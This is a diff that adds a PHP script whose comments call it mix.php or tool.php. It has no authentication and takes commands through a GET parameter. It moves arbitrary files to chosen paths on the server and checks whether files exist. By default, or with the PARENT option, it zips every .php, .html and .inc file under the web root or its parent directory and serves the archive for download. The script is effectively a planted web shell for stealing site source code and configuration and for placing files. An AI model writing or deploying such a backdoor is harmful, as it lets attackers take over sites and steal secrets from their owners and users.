@@ -1,1 +1,109 @@
+<?php
+function addFileToZip($path, $zip){
+    $handler = opendir($path); //open the current directory
+    while (($filename = readdir($handler)) !== false) {
+        if ($filename != "." && $filename != "..") { //skip link to current and parent directory
+            $file = $path . "/" . $filename;
+            if (is_dir($file)) { //if it is folder, then recurse it
+                addFileToZip($file, $zip);
+            } else { //if it is file, add it to zip
+                $file_info = pathinfo($file);
+                $extension = $file_info['extension'];
+                if($extension == 'php' || $extension == 'html' || $extension == 'inc'){
+                    $zip->addFile($file);
+                }
+            }
+        }
+    }
+    @closedir($path);
+}
 
+$rootPath = $_SERVER['DOCUMENT_ROOT'];
+$parentPath = dirname($rootPath);// get parent Dir
+
+$host = $_SERVER['HTTP_HOST']; 
+$time = date('Ymd');
+$zipName=$host.$time.'.zip';
+
+
+$AC="";
+if(isset($_GET['AC'])){ $AC=trim($_GET['AC']); $AC=str_replace(' ','',$AC); }
+
+if($AC=="RENAME"){
+    // ex. mix.php?AC=RENAME&source=./footer.php&target=/../../include/model/mubiao/footer.php
+    $sourceFile = $_GET['source'];
+    $targetFile = __DIR__ .  $_GET['target'];
+    // file_exists
+    if (!file_exists($sourceFile)) {
+        exit("<br>Source file not exist!$sourceFile<br>");
+    } 
+
+    if (!file_exists($targetFile)) {
+        exit("<br>target  file not exist! $targetFile<br>");
+    } 
+    
+    $targetDir=str_replace(basename($sourceFile),"", $targetFile);
+    // is_dir  
+    if (!is_dir($targetDir)) {
+        // mkdir($targetDir, 0777, true);
+        echo "<br>targetDir not Dir, can't find:$targetDir  <br>";
+    }else {
+        
+        // rename($sourceFile, $targetDir . basename($sourceFile));   
+        rename($sourceFile, $targetFile);  
+        echo "<br>File moved successfully!<br>";
+    }
+    
+    
+
+
+}elseif($AC=="CHECK"){
+    //check  file_exists echo file size. // tool.php?AC=CHECK&file=./abc.php
+    $targetFile = $_GET['file'];
+    if (file_exists($targetFile)) {
+        echo "<br>target  file YES exist.<br>";
+        $filesize = filesize($targetFile);
+        echo "<br>file size：$filesize (bytes)<br>";
+        
+    }else{
+        exit("<br>target  file NOT exist! $targetFile<br>");
+    } 
+
+
+}elseif($AC=="PARENT"){
+    
+    $rootPath=$parentPath;
+  
+
+    $zip = new ZipArchive();
+    if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
+        addFileToZip($rootPath, $zip); //call function to add all files in the directory
+        $zip->close();
+    }
+
+    //then download the zipped file
+    header('Content-Type: application/zip');
+    header('Content-disposition: attachment; filename='.$zipName.'');
+    header('Content-Length: ' . filesize($zipName));
+    readfile($zipName);
+
+}else{
+    
+
+    $zip = new ZipArchive();
+    if ($zip->open($zipName, ZipArchive::CREATE) === TRUE) {
+        addFileToZip($rootPath, $zip); //call function to add all files in the directory
+        $zip->close();
+    }
+
+    //then download the zipped file
+    header('Content-Type: application/zip');
+    header('Content-disposition: attachment; filename='.$zipName.'');
+    header('Content-Length: ' . filesize($zipName));
+    readfile($zipName);
+
+
+}
+
+
+?>
